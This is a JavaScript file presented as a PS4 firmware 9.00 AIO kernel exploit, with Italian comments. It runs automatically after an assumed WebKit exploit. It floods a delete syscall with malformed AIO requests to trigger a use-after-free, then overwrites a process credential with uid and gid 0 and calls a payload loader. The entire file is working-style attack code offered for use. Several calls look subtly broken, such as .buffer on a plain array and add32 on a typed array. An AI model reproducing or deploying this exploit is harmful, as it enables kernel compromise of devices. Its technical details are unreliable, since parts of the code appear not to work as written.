// aio_exploit.js - PS4 9.00 AIO Kernel Exploit
"use strict";

const AIO_CONFIG = {
    MULTI_DELETE_SYSCALL: 323,
    CRED_OFFSET: 0x18,
    MAX_REQUESTS: 768,
    REQUEST_CHUNK: 32,
    AIO_CTX_SIZE: 0x400
};

let aioCtx = null;
let reqArray = null;
let resBuf = null;

function initAIO() {
    try {
        // Alloca contesto AIO
        aioCtx = chain.syscall(477, 0, AIO_CONFIG.AIO_CTX_SIZE, 0x7, 0x1002, -1, 0);
        
        // Configura struttura interna AIO
        const aioInternal = p.malloc32(0x200);
        p.write8(aioCtx.add32(8), aioInternal);
        p.write8(aioInternal.add32(0xAB8), new int64(0xCAFEBABE, 0x0));
        p.write4(aioInternal.add32(0xAC0), -1);

        // Prepara array richieste malformate
        reqArray = p.malloc32(128);
        const reqView = new Uint32Array(reqArray.backing.buffer);
        for(let i = 0; i < AIO_CONFIG.REQUEST_CHUNK; i++) {
            reqView[i] = (i << 16) | 0xDEADBEEF;
        }

        // Alloca buffer risultati
        resBuf = p.malloc32(128);

        return true;
    } catch(e) {
        alert(`AIO Init Failed: ${e.message}`);
        return false;
    }
}

function triggerAIOUAF() {
    try {
        for(let i = 0; i < AIO_CONFIG.MAX_REQUESTS; i++) {
            chain.fcall(libKernelBase.add32(OFFSET_lk_syscall),
                      AIO_CONFIG.MULTI_DELETE_SYSCALL,
                      aioCtx,
                      reqArray,
                      AIO_CONFIG.REQUEST_CHUNK,
                      resBuf);

            // Stabilizza ogni 64 richieste
            if(i % 64 === 0) {
                chain.fcall(gadgets["sti"]);
                chain.fcall(window.syscalls[203], resBuf, 128);
            }
        }
        return true;
    } catch(e) {
        alert(`AIO Trigger Failed: ${e.message}`);
        return false;
    }
}

function elevatePrivileges() {
    try {
        const credScan = p.malloc32(0x1000);
        const pattern = [0x6B, 0x65, 0x72, 0x6E, 0x5F, 0x63, 0x72, 0x65]; // "kern_cre"
        
        chain.syscall(363, credScan, 0x1000, 
                     p.read4(new Uint8Array(pattern.buffer)),
                     p.read4(new Uint8Array(pattern.buffer).add32(4)));
        
        const credAddr = p.read8(credScan.add32(0x18));
        const fakeCred = p.malloc32(0x40);
        
        p.write8(credAddr.add32(AIO_CONFIG.CRED_OFFSET), fakeCred);
        p.write4(fakeCred.add32(0x04), 0); // uid
        p.write4(fakeCred.add32(0x08), 0); // gid

        return true;
    } catch(e) {
        alert(`Priv Escalation Failed: ${e.message}`);
        return false;
    }
}

function cleanupAIO() {
    try {
        chain.fcall(window.syscalls[73], aioCtx, AIO_CONFIG.AIO_CTX_SIZE);
        chain.fcall(window.syscalls[203], reqArray, 128);
        chain.fcall(window.syscalls[203], resBuf, 128);
    } catch(e) {
        console.error("AIO Cleanup Error:", e);
    }
}

function runAIOSploit() {
    if(!initAIO()) return;
    if(!triggerAIOUAF()) return;
    if(!elevatePrivileges()) return;
    
    // Caricamento payload
    if(typeof loadPayload === 'function') {
        loadPayload();
    } else {
        alert("Payload loader non trovato!");
    }
    
    cleanupAIO();
}

// Esegui automaticamente dopo il WebKit exploit
if(window.webkitInitialized && typeof chain !== 'undefined') {
    alert("Avvio exploit AIO...");
    runAIOSploit();
} else {
    alert("WebKit exploit necessario prima!");
}
